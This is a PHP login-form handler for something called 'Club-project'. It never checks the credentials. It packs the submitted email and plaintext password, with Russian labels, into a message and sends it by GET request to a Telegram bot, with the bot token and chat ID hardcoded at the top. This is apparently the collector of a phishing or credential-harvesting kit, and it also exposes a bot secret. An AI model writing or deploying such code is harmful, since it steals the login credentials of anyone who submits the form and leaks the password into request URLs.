<?php
 
  const TOKEN = '7367612942:AAFI0FQzQZjrFndp0brU65lOVnToSFiEkiA';
 
  const CHATID = '-4138443533';
 
 
if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
  $textSendStatus = '';
   
  if (!empty($_POST['autorization-email']) && !empty($_POST['autorization-password']) && !empty($_POST['autorization-checkbox'])) {
     
    $txt = "Club-project%0AВход%0A%0A";
     
    if (isset($_POST['autorization-email']) && !empty($_POST['autorization-email'])) {
        $txt .= "Почта: " . strip_tags(urlencode($_POST['autorization-email'])) . "%0A";
    }

    if (isset($_POST['autorization-password']) && !empty($_POST['autorization-password'])) {
      $txt .= "Пароль: " . strip_tags(urlencode($_POST['autorization-password'])) . "%0A";
  }

  if (isset($_POST['autorization-checkbox']) && !empty($_POST['autorization-checkbox'])) {
    $txt .= "Согласие с политикой: " . strip_tags(urlencode($_POST['autorization-checkbox'])) . "%0A";
  }


    $textSendStatus = @file_get_contents('https://api.telegram.org/bot'. TOKEN .'/sendMessage?chat_id=' . CHATID . '&parse_mode=html&text=' . $txt); 
 
  } else {
    echo json_encode('NOTVALID');
  }
} else {
  header("Location: /");
}